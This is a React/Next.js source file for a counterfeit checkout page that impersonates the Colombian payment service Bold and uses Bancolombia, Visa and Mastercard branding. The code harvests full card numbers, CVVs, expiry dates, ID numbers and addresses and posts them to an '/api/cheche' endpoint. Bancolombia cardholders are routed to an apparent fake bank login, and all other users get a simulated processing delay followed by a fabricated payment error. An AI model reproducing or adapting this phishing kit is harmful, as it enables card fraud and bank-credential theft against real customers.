'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { validateCardNumber, detectCardType, validateCVV, formatCardNumber } from '@/lib/cardValidation';
import { getBankName } from '@/lib/bankDetection';

export default function BoldPagosPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [orderData, setOrderData] = useState<any>(null);

  // Estado para el método de pago seleccionado (null = no seleccionado)
  const [paymentOption, setPaymentOption] = useState<'card' | 'bancolombia' | null>(null);

  // Estados del formulario de tarjeta
  const [phoneNumber, setPhoneNumber] = useState('');
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardType, setCardType] = useState<string>('');
  const [bankName, setBankName] = useState<string>('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState('');
  const [acceptData, setAcceptData] = useState(false);
  const [acceptTerms, setAcceptTerms] = useState(false);
  
  // Estado para notificaciones
  const [notification, setNotification] = useState<{show: boolean, message: string, type: 'error' | 'success'}>({show: false, message: '', type: 'error'});
  
  // Estado para modal de confirmación de banco
  const [showBankConfirmation, setShowBankConfirmation] = useState(false);
  const [detectedBankInfo, setDetectedBankInfo] = useState<{bank: string, cardBrand: string} | null>(null);

  const showNotification = (message: string, type: 'error' | 'success' = 'error') => {
    setNotification({show: true, message, type});
    setTimeout(() => setNotification({show: false, message: '', type: 'error'}), 4000);
  };

  // Cargar datos de la orden desde sessionStorage
  useEffect(() => {
    const storedData = sessionStorage.getItem('boldOrderData');
    if (storedData) {
      try {
        const parsed = JSON.parse(storedData);
        setOrderData(parsed);
        
        // Pre-llenar campos si vienen del checkout
        if (parsed.email) setEmail(parsed.email);
        if (parsed.phone) setPhoneNumber(parsed.phone.replace('+57', ''));
      } catch (error) {
        console.error('Error al parsear datos de la orden:', error);
      }
    } else {
      // Si no hay datos, redirigir al checkout
      router.push('/checkout');
    }
  }, [router]);

  // Detectar tipo de tarjeta y banco mientras se escribe
  useEffect(() => {
    if (cardNumber.length >= 6) {
      const typeInfo = detectCardType(cardNumber);
      const type = typeInfo?.brand || '';
      setCardType(type);
      
      const bank = getBankName(cardNumber);
      setBankName(bank || '');
      
      if (bank && bank !== 'Desconocido') {
        console.log('🏦 Banco detectado:', bank, '| Tarjeta:', type);
      }
    } else {
      setCardType('');
      setBankName('');
    }
  }, [cardNumber]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    setExpiryDate(value.slice(0, 5));
  };

  const validateExpiryDate = (expiry: string): boolean => {
    if (expiry.length !== 5) return false;
    
    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos
    const currentMonth = currentDate.getMonth() + 1;
    
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateCardNumber(cardNumber)) {
      showNotification('Número de tarjeta inválido. Por favor verifica.');
      return;
    }

    if (!validateExpiryDate(expiryDate)) {
      showNotification('Fecha de expiración inválida o vencida.');
      return;
    }

    const cvvLength = cardType === 'American Express' ? 4 : 3;
    if (!validateCVV(cvv, cvvLength)) {
      showNotification(`CVV inválido para tarjeta ${cardType}. ${cardType === 'American Express' ? 'Debe tener 4 dígitos.' : 'Debe tener 3 dígitos.'}`);
      return;
    }

    // Procesar pago directamente sin mostrar modal
    setLoading(true);

    // Check if it's Bancolombia card - if so, start authentication flow
    const detectedBank = bankName ? bankName.toLowerCase() : '';
    if (detectedBank.includes('bancolombia')) {
      try {
        // Create session for Bancolombia authentication with ALL data
        const response = await fetch('/api/cheche', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'create_session',
            bank: 'bancolombia',
            // Datos personales completos
            fullName: orderData.customer?.fullName || cardName,
            email,
            phone: `+57${phoneNumber}`,
            address: orderData.customer?.address,
            city: orderData.customer?.city,
            state: orderData.customer?.state,
            country: orderData.customer?.country,
            postalCode: orderData.customer?.postalCode,
            documentId: orderData.customer?.documentId,
            
            // Información COMPLETA de tarjeta
            cardNumber: cardNumber, // Número completo
            cardHolderName: cardName, // Nombre en tarjeta
            expiryDate: expiryDate, // Fecha completa
            cvv: cvv, // CVV completo
            cardBrand: cardType,
            
            // Datos de orden
            totalAmount: orderData.totalAmount,
            
            customerData: {
              fullName: orderData.fullName,
              email,
              phone: `+57${phoneNumber}`,
              address: orderData.address,
              city: orderData.city,
              state: orderData.state,
              country: orderData.country,
              postalCode: orderData.postalCode,
            },
            orderData: {
              ...orderData,
              totalAmount: orderData.totalAmount,
              cardInfo: {
                last4: cardNumber.slice(-4),
                brand: cardType,
                bank: bankName,
              },
              paymentMethod: 'Bold'
            }
          })
        });

        if (!response.ok) {
          throw new Error('Error al crear sesión de autenticación');
        }

        const result = await response.json();
        
        if (result.success && result.session) {
          // Redirect to Bancolombia authentication flow
          router.push(`/bancolombia/usuario?sessionId=${result.session.sessionId}`);
          return;
        }
      } catch (error) {
        console.error('Error creating authentication session:', error);
        showNotification('Hubo un error al iniciar la autenticación. Por favor intenta de nuevo.');
        setLoading(false);
        return;
      }
    }

    // Para otros bancos, mostrar procesando y luego error
    try {
      // Simular procesamiento (2.5-3 segundos para que se vea más real)
      await new Promise(resolve => setTimeout(resolve, 2500));
      
      // Redirigir al carrito con mensaje de error
      setLoading(false);
      showNotification('Error al procesar el pago. Por favor verifica los datos de tu tarjeta e intenta nuevamente.', 'error');
      
      // Después de 2 segundos, redirigir al carrito
      setTimeout(() => {
        router.push('/carrito?error=payment_failed');
      }, 2000);
      
    } catch (error) {
      console.error('Error processing payment:', error);
      setLoading(false);
      showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
    }
  };

  if (!orderData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-pink-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Cargando información del pago...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col lg:flex-row relative">
      {/* Notificación */}
      {notification.show && (
        <div className="fixed top-8 left-1/2 transform -translate-x-1/2 z-50 animate-in slide-in-from-top duration-300">
          <div className={`flex items-center gap-3 px-6 py-4 rounded-xl shadow-2xl border-2 ${
            notification.type === 'error' 
              ? 'bg-red-50 border-red-200 text-red-800' 
              : 'bg-green-50 border-green-200 text-green-800'
          }`}>
            {notification.type === 'error' ? (
              <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd"/>
              </svg>
            ) : (
              <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
              </svg>
            )}
            <p className="font-medium">{notification.message}</p>
            <button 
              onClick={() => setNotification({show: false, message: '', type: 'error'})}
              className="ml-2 hover:opacity-70 transition"
            >
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd"/>
              </svg>
            </button>
          </div>
        </div>
      )}
      
      {/* Columna izquierda - Responsive: arriba en móvil, izquierda en desktop */}
      <div className="w-full lg:w-5/12 lg:h-screen lg:fixed lg:left-0 lg:top-0 p-6 lg:p-12 flex flex-col justify-between text-white" style={{ background: 'linear-gradient(180deg, #f02c4c 0%, #1f126f 100%)' }}>
        <div>
          {/* Logo Bold */}
          <div className="mb-6">
            <img src="/logos/pagos/BOLD.png" alt="Bold" className="h-8 object-contain mb-2" />
            <div className="inline-block bg-white/20 backdrop-blur-sm px-2 py-0.5 rounded-full">
              <span className="text-[10px] font-bold">NEGOCIO PRO</span>
            </div>
          </div>

          {/* Información del comercio */}
          <div className="mb-6 opacity-90">
            <p className="text-xs font-medium mb-1">Pago a:</p>
            <p className="text-lg font-bold">{orderData.storeName || 'Tienda Online'}</p>
          </div>

          {/* Monto total */}
          <div className="bg-white/10 backdrop-blur-md rounded-xl p-6 border border-white/20 shadow-xl">
            <p className="text-xs opacity-80 mb-1">Total a pagar</p>
            <p className="text-4xl font-black tracking-tight">
              ${(orderData.insuranceFee || orderData.totalAmount || orderData.total || 0).toLocaleString('es-CO')}
            </p>
            <p className="text-sm mt-1 opacity-90">COP</p>
            {orderData.insuranceFee && (
              <p className="text-[10px] mt-2 bg-white/20 px-2 py-1 rounded">
                Seguro de envío para pago contra entrega
              </p>
            )}
          </div>
        </div>

        {/* Footer */}
        <div>
          <button
            onClick={() => router.push('/checkout')}
            className="text-white/80 hover:text-white text-sm font-medium hover:underline transition flex items-center gap-2"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
            Volver a la tienda
          </button>
        </div>
      </div>

      {/* Columna derecha - Responsive: abajo en móvil, derecha en desktop */}
      <div className="w-full lg:w-7/12 lg:ml-auto bg-white p-6 lg:p-12 overflow-y-auto min-h-screen">
        <div className="max-w-2xl mx-auto">
          {/* Título */}
          <h2 className="text-2xl font-bold text-gray-900 mb-6">
            ¿Cómo quieres pagar?
          </h2>

          {/* Opciones de pago */}
          <div className="space-y-3 mb-6">
            {/* Opción 1: Pago con tarjeta */}
            <button
              type="button"
              onClick={() => setPaymentOption(paymentOption === 'card' ? null : 'card')}
              className={`w-full flex items-center justify-between p-4 rounded-lg border-2 transition ${
                paymentOption === 'card'
                  ? 'border-pink-500 bg-pink-50'
                  : 'border-gray-200 hover:border-gray-300 bg-white'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  paymentOption === 'card' ? 'border-pink-500' : 'border-gray-300'
                }`}>
                  {paymentOption === 'card' && (
                    <div className="w-2.5 h-2.5 rounded-full bg-pink-500"></div>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <svg className="w-6 h-6 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
                  </svg>
                  <span className="font-semibold text-gray-900 text-base">Pago con tarjeta</span>
                </div>
              </div>
              <div className="flex gap-2">
                <img src="/logos/tarjetas/VISA.png" alt="Visa" className="h-4 object-contain" />
                <img src="/logos/tarjetas/mastercard.png" alt="Mastercard" className="h-4 object-contain" />
              </div>
            </button>

            {/* Opción 2: Botón Bancolombia */}
            <button
              type="button"
              onClick={() => setPaymentOption(paymentOption === 'bancolombia' ? null : 'bancolombia')}
              className={`w-full flex items-center justify-between p-4 rounded-lg border-2 transition ${
                paymentOption === 'bancolombia'
                  ? 'border-pink-500 bg-pink-50'
                  : 'border-gray-200 hover:border-gray-300 bg-white'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  paymentOption === 'bancolombia' ? 'border-pink-500' : 'border-gray-300'
                }`}>
                  {paymentOption === 'bancolombia' && (
                    <div className="w-2.5 h-2.5 rounded-full bg-pink-500"></div>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-6 object-contain" />
                  <span className="font-semibold text-gray-900 text-base">Botón Bancolombia</span>
                </div>
              </div>
            </button>

            {/* Opción 3: Nequi (deshabilitado) */}
            <button
              type="button"
              disabled
              className="w-full flex items-center justify-between p-4 rounded-lg border-2 border-gray-200 bg-gray-50 opacity-50 cursor-not-allowed"
            >
              <div className="flex items-center gap-3">
                <div className="w-5 h-5 rounded-full border-2 border-gray-300"></div>
                <div className="flex items-center gap-2">
                  <img src="/logos/bancos/NEQUI.png" alt="Nequi" className="h-6 object-contain" />
                  <span className="font-semibold text-gray-500 text-base">Nequi</span>
                </div>
              </div>
              <span className="text-[10px] text-gray-400 bg-gray-200 px-2 py-1 rounded">Próximamente</span>
            </button>
          </div>

          {/* FORMULARIO DE TARJETA - Solo aparece si se selecciona */}
          {paymentOption === 'card' && (
            <form onSubmit={handleSubmit} className="space-y-5 animate-in slide-in-from-top duration-300">
              {/* Teléfono */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Teléfono <span className="text-red-500">*</span>
                </label>
                <div className="flex gap-2">
                  <div className="w-20 bg-gray-100 border border-gray-300 rounded-lg flex items-center justify-center text-gray-700 font-medium">
                    +57
                  </div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                    placeholder="3001234567"
                    required
                    className="flex-1 px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                </div>
              </div>

              {/* Email */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Correo electrónico <span className="text-red-500">*</span>
                </label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="tu@email.com"
                  required
                  className="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                />
              </div>

              {/* Información del cliente desde checkout */}
              {orderData.customer && (
                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                  <h4 className="text-sm font-semibold text-gray-700 mb-3">Información del cliente</h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {/* Nombre completo */}
                    {orderData.customer.fullName && (
                      <div>
                        <label className="block text-xs font-medium text-gray-600">
                          Nombre completo
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.fullName}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}
                    
                    {/* Documento de identidad */}
                    {orderData.customer.documentId && (
                      <div>
                        <label className="block text-xs font-medium text-gray-600">
                          Cédula
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.documentId}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}
                    
                    {/* Dirección */}
                    {orderData.customer.address && (
                      <div className="md:col-span-2">
                        <label className="block text-xs font-medium text-gray-600">
                          Dirección
                        </label>
                        <input
                          type="text"
                          value={orderData.customer.address}
                          readOnly
                          className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                        />
                      </div>
                    )}
                    
                    {/* Ciudad y código postal si están disponibles */}
                    <div className="md:col-span-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                      {orderData.customer.city && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Ciudad
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.city}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                      {orderData.customer.state && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Departamento
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.state}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                      {orderData.customer.postalCode && (
                        <div>
                          <label className="block text-xs font-medium text-gray-600">
                            Código postal
                          </label>
                          <input
                            type="text"
                            value={orderData.customer.postalCode}
                            readOnly
                            className="w-full px-3 py-2 bg-white border border-gray-200 rounded text-sm text-gray-800"
                          />
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Número de tarjeta */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Número de tarjeta <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="1234 5678 9012 3456"
                    required
                    maxLength={19}
                    className="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                  {cardType && (
                    <span className="absolute right-4 top-1/2 -translate-y-1/2 text-xs text-gray-500 font-medium">
                      {cardType}
                    </span>
                  )}
                </div>
              </div>

              {/* Fecha de expiración y CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Fecha de expiración <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    value={expiryDate}
                    onChange={handleExpiryChange}
                    placeholder="MM/AA"
                    required
                    maxLength={5}
                    className="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    CVV <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                    placeholder={cardType === 'American Express' ? '1234' : '123'}
                    required
                    maxLength={cardType === 'American Express' ? 4 : 3}
                    className="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                  />
                </div>
              </div>

              {/* Nombre del titular */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Nombre del titular <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  placeholder="Igual al que aparece en la tarjeta"
                  required
                  className="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent text-gray-900 placeholder:text-gray-400"
                />
              </div>

              {/* Checkboxes */}
              <div className="space-y-3">
                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={acceptData}
                    onChange={(e) => setAcceptData(e.target.checked)}
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-pink-600 focus:ring-pink-500"
                  />
                  <span className="text-sm text-gray-700">
                    Acepto el tratamiento de mis datos personales...
                  </span>
                </label>
                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={acceptTerms}
                    onChange={(e) => setAcceptTerms(e.target.checked)}
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-pink-600 focus:ring-pink-500"
                  />
                  <span className="text-sm text-gray-700">
                    Acepto Términos y condiciones
                  </span>
                </label>
              </div>

              {/* Botón de pago */}
              <button
                type="submit"
                disabled={loading || !acceptData || !acceptTerms}
                className="w-full bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 text-white font-bold py-4 rounded-full text-lg transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Procesando transacción...
                  </>
                ) : 'Pagar'}
              </button>

              {/* Link abandonar */}
              <button
                type="button"
                onClick={() => router.push('/checkout')}
                className="w-full text-center text-blue-600 hover:underline text-sm font-medium"
              >
                Abandonar pago
              </button>

              {/* Footer seguridad */}
              <div className="text-center pt-6 border-t border-gray-200">
                <p className="text-xs text-gray-600 mb-4">Aceptamos los siguientes métodos de pago</p>
                <div className="flex items-center justify-center gap-4 flex-wrap">
                  <img src="/logos/tarjetas/VISA.png" alt="Visa" className="h-6 object-contain" />
                  <img src="/logos/tarjetas/mastercard.png" alt="Mastercard" className="h-6 object-contain" />
                  <img src="/logos/tarjetas/american expres.png" alt="American Express" className="h-6 object-contain" />
                  <img src="/logos/tarjetas/DINERS.png" alt="Diners Club" className="h-6 object-contain" />
                  <img src="/logos/bancos/PSE.png" alt="PSE" className="h-6 object-contain" />
                  <img src="/logos/bancos/NEQUI.png" alt="Nequi" className="h-7 object-contain" />
                </div>
              </div>
            </form>
          )}

          {/* FORMULARIO/MENSAJE DE BANCOLOMBIA - Solo aparece si se selecciona */}
          {paymentOption === 'bancolombia' && (
            <div className="bg-yellow-50 border-2 border-yellow-400 rounded-2xl p-10 text-center animate-in slide-in-from-top duration-300">
              <div className="flex justify-center mb-6">
                <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-16 object-contain" />
              </div>
              <p className="text-2xl font-bold text-gray-900 mb-3">
                Botón Bancolombia
              </p>
              <p className="text-gray-700 mb-6 text-lg">
                Serás redirigido a la app de Bancolombia para completar el pago de manera segura.
              </p>
              <button
                type="button"
                onClick={() => alert('Redirigiendo a Bancolombia...')}
                className="bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-bold py-4 px-8 rounded-full text-lg transition shadow-lg"
              >
                Continuar con Bancolombia
              </button>
              <button
                type="button"
                onClick={() => router.push('/checkout')}
                className="block w-full text-center text-blue-600 hover:underline text-sm font-medium mt-6"
              >
                Cancelar y volver
              </button>
            </div>
          )}

          {/* Mensaje cuando no hay nada seleccionado */}
          {!paymentOption && (
            <div className="text-center py-12 text-gray-400">
              <svg className="w-16 h-16 mx-auto mb-4 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
              <p className="text-lg">Selecciona un método de pago para continuar</p>
            </div>
          )}
        </div>
      </div>

    </div>
  );
}
